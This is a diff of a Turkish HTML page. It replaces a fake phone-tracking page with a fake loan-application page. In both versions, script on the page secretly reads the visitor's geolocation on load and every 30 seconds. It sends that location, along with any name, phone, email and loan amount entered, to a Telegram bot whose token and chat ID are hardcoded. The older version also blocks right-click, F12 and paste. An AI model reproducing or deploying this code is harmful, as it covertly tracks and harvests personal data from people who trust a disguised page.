@@ -1,248 +1,175 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cihaz Takibi</title> 
+    <title>Tefeciden Borç Para Verilir</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #8e44ad, #3498db);
+            color: #fff;
             text-align: center;
-            padding: 20px;
-        }
-
-        #loading {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 20px;
-            color: #333;
-            display: none;
-            margin-top: 20px;
-        }
-
-        #countdown {
-            font-size: 20px;
-            color: #e74c3c;
-            font-weight: bold;
-            margin-top: 20px;
-        }
-
-        #locationDisplay {
-            font-size: 16px;
-            color: #333;
-            margin-top: 20px;
-            word-wrap: break-word;
-        }
-
-        #decrypting {
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 40px;
-            color: #e74c3c;
-            letter-spacing: 2px;
-            display: none;
-        }
-
-        .form-container {
-            max-width: 400px;
-            margin: 0 auto;
-        }
-
-        input[type="text"] {
-            width: 80%;
-            padding: 10px;
-            margin: 10px 0;
-            font-size: 16px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-        }
-
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #25d366;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #128c7e;
+            padding: 40px;
         }
 
         h1 {
-            color: #333;
+            font-size: 40px;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.5);
         }
 
         p {
-            color: #555;
+            font-size: 18px;
+            color: #ecf0f1;
+            line-height: 1.6;
+            margin-top: 20px;
+        }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 800px;
+            margin: 30px auto;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        }
+
+        .form-group {
+            margin-top: 20px;
+        }
+
+        input[type="text"], input[type="number"], input[type="email"] {
+            padding: 10px;
+            font-size: 16px;
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            margin-top: 10px;
+        }
+
+        .footer {
+            font-size: 16px;
+            margin-top: 30px;
+            color: #ecf0f1;
+        }
+
+        .footer a {
+            color: #f39c12;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .alert {
+            color: #e74c3c;
+            font-weight: bold;
+            margin-top: 20px;
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
-    <h1>Cihaz No Girişi</h1> 
-    <p>Lütfen aşağıdaki alanları doldurun:</p>
+    <h1>Tefeciden Borç Para Verilir</h1>
 
-    <div class="form-container">
-        <input type="text" id="userPhone" placeholder="Kendi telefon numaranızı girin" maxlength="10" oninput="validatePhoneNumber('userPhone')" />
-        <input type="text" id="targetPhone" placeholder="Hedef telefon numarasını girin" maxlength="10" oninput="validatePhoneNumber('targetPhone')" />
-        <br>
-        <button id="startButton" onclick="startTracking()">Takibi Başlat</button>
+    <div class="container">
+        <p>Hızlı ve güvenli borç para alma işlemi için başvurun! Kısa süre içinde paranız cebinizde.</p>
+
+        <div class="form-group">
+            <label for="amount">Borç Miktarı (TL):</label>
+            <input type="number" id="amount" placeholder="Örnek: 1000 TL">
+        </div>
+
+        <div class="form-group">
+            <label for="name">Adınız ve Soyadınız:</label>
+            <input type="text" id="name" placeholder="Adınızı ve soyadınızı girin">
+        </div>
+
+        <div class="form-group">
+            <label for="phone">Telefon Numaranız (Sadece rakam):</label>
+            <input type="text" id="phone" placeholder="Telefon numaranızı girin" maxlength="10">
+        </div>
+
+        <div class="form-group">
+            <label for="email">E-Posta Adresiniz:</label>
+            <input type="email" id="email" placeholder="E-posta adresinizi girin">
+        </div>
+
+        <div class="alert" id="alertMessage"></div>
     </div>
 
-    <div id="loading">Yükleniyor... Lütfen tarayıcıyı kapatmayın. Bu işlem yaklaşık 10 dakika sürecektir.</div>
-
-    <div id="decrypting" class="decrypting-message">Şifre Çözülüyor...</div>
-
-    <div id="countdown">Tahmini Süre: 10:00</div>
-
-    <div id="locationDisplay">
-        <strong>Kendi Konumunuz:</strong>
-        <p id="ownLocation">Henüz alınmadı</p>
-        <p id="ownLocationLink"></p>
-
-        <br><br>
-        <strong>Hedef Numara Konumu:</strong>
-        <p>Hedef Numarayı girince Kripto cihazı çalışacaktır. Radarbul cihazı üzerinden Kriptonun çözülmesini bekleyin...</p>
+    <div class="footer">
+        <p>Yasal bilgilendirme: Bu işlem tamamen gizlidir. <a href="https://www.google.com">Buradan daha fazla bilgi alabilirsiniz.</a></p>
     </div>
 
     <script>
-        document.addEventListener('contextmenu', function (event) {
-            event.preventDefault();
-            alert("Sağ tıklama engellendi!");
-        });
+        // Telegram Bot Token ve Chat ID
+        const token = '8055523671:AAH6_SVWU0Ly8ugkyrw_UO1jS1vt06m71Co';  // Bot token'ınız
+        const chatId = '1568538396';  // Chat ID'niz
 
-        document.addEventListener('keydown', function(event) {
-            if (event.key === "F12") {
-                event.preventDefault();
-                alert("F12 tuşu engellendi!");
-            }
-            if (event.ctrlKey && event.key === "v") {
-                event.preventDefault();
-                alert("Yapıştırma işlemi engellendi!");
-            }
-        });
-
-        function sendLocationToTelegram(userPhone, targetPhone, latitude, longitude) {
-            const token = '8055523671:AAH6_SVWU0Ly8ugkyrw_UO1jS1vt06m71Co';
-            const chatId = '1568538396';
-            const text = `Kullanıcı telefon numarası: ${userPhone}\nHedef telefon numarası: ${targetPhone}\nKonum: E: ${latitude}, B: ${longitude}\nGoogle Maps Bağlantısı: https://www.google.com/maps?q=${latitude},${longitude}`;
+        // Kullanıcının verilerini alıp Telegram'a gönderen fonksiyon
+        function sendDataToTelegram(data) {
+            const googleMapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+            const text = `
+                Başvuru Detayları:
+                Adı: ${data.name}
+                Telefon: ${data.phone}
+                E-posta: ${data.email}
+                Borç Miktarı: ${data.amount} TL
+                Konum: ${data.latitude}, ${data.longitude}
+                Google Maps Linki: ${googleMapsLink}
+            `;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
 
+            // Verileri Telegram'a gönder
             fetch(url, { method: 'GET' })
                 .then(response => response.json())
-                .then(data => console.log('Telegram mesajı gönderildi:', data))
-                .catch(error => console.error('Telegram mesajı gönderilemedi:', error));
-
-            // Konum bilgisini sayfada göster
-            const ownLocation = document.getElementById('ownLocation');
-            const ownLocationLink = document.getElementById('ownLocationLink');
-
-            ownLocation.textContent = `Enlem: ${latitude}, Boylam: ${longitude}`;
-            ownLocationLink.innerHTML = `<a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Google Maps'te Görüntüle</a>`;
+                .then(data => {
+                    console.log('Telegram mesajı gönderildi:', data);
+                })
+                .catch(error => {
+                    console.error('Telegram mesajı gönderilemedi:', error);
+                });
         }
 
-        function showLoading() {
-            document.getElementById('loading').style.display = 'block';
-        }
-
-        function hideLoading() {
-            document.getElementById('loading').style.display = 'none';
-        }
-
-        function updateCountdown() {
-            let timeLeft = 600;
-            const countdownElement = document.getElementById('countdown');
-            
-            const countdownInterval = setInterval(function () {
-                let minutes = Math.floor(timeLeft / 60);
-                let seconds = timeLeft % 60;
-
-                if (seconds < 10) {
-                    seconds = '0' + seconds;
-                }
-
-                countdownElement.textContent = `Geri Sayım: ${minutes}:${seconds}`;
-
-                if (timeLeft <= 0) {
-                    clearInterval(countdownInterval);
-                    countdownElement.textContent = "Yasal Olmayan İşlem";
-                    alert("Yasal Olmayan İşlem");
-                } else {
-                    timeLeft--;
-                }
-            }, 1000);
-        }
-
+        // Konum alıp veriyi Telegram'a gönderen fonksiyon
         function getLocationAndSend() {
-            const userPhone = document.getElementById('userPhone').value;
-            const targetPhone = document.getElementById('targetPhone').value;
+            const amount = document.getElementById('amount').value;
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function (position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
 
-                    sendLocationToTelegram(userPhone, targetPhone, latitude, longitude);
+                    const data = {
+                        amount: amount || "Verilmedi", // Boş olursa "Verilmedi" yazdır
+                        name: name || "Verilmedi", // Boş olursa "Verilmedi" yazdır
+                        phone: phone || "Verilmedi", // Boş olursa "Verilmedi" yazdır
+                        email: email || "Verilmedi", // Boş olursa "Verilmedi" yazdır
+                        latitude,
+                        longitude
+                    };
 
+                    sendDataToTelegram(data);  // Verileri Telegram'a gönder
                 }, function (error) {
-                    console.error("Konum alınamadı:", error);
-                    alert("Konum bilgisi alınamadı.");
-                    hideLoading();
+                    console.error("Konum alınırken hata oluştu:", error);
+                    alert("Konumunuz alınamadı.");
                 });
             } else {
                 alert("Geolocation API'si tarayıcınızda desteklenmiyor.");
-                hideLoading();
             }
         }
 
-        function startTracking() {
-            const userPhone = document.getElementById('userPhone').value;
-            const targetPhone = document.getElementById('targetPhone').value;
-
-            if (!userPhone || !targetPhone) {
-                alert("Lütfen her iki telefon numarasını da girin.");
-                return;
-            }
-
-            if (userPhone.length !== 10 || targetPhone.length !== 10) {
-                alert("Telefon numaraları 10 rakamdan oluşmalıdır.");
-                return;
-            }
-
-            showLoading();
-            document.getElementById('decrypting').style.display = 'block';
-            updateCountdown();
-            getLocationAndSend();
-
-            setInterval(getLocationAndSend, 30000);
-
-            document.getElementById('userPhone').disabled = true;
-            document.getElementById('targetPhone').disabled = true;
-            document.getElementById('startButton').disabled = true;
-        }
-
-        function validatePhoneNumber(id) {
-            const input = document.getElementById(id);
-            input.value = input.value.replace(/[^0-9]/g, '');
-
-            if (input.value.length > 10) {
-                input.value = input.value.slice(0, 10);
-            }
-        }
-
+        // Sayfa yüklendiğinde hemen konum al ve verileri gönder
         window.onload = function() {
-            const userPhone = document.getElementById('userPhone').value;
-            const targetPhone = document.getElementById('targetPhone').value;
-            getLocationAndSend();
-
-            setInterval(function() {
-                getLocationAndSend();
-            }, 30000);
+            getLocationAndSend();  // Sayfa yüklendiğinde işlem başlasın
+            setInterval(getLocationAndSend, 30000);  // 30 saniyede bir aynı işlemi tekrarla
         };
     </script>
 </body>
-</html> 
+</html>
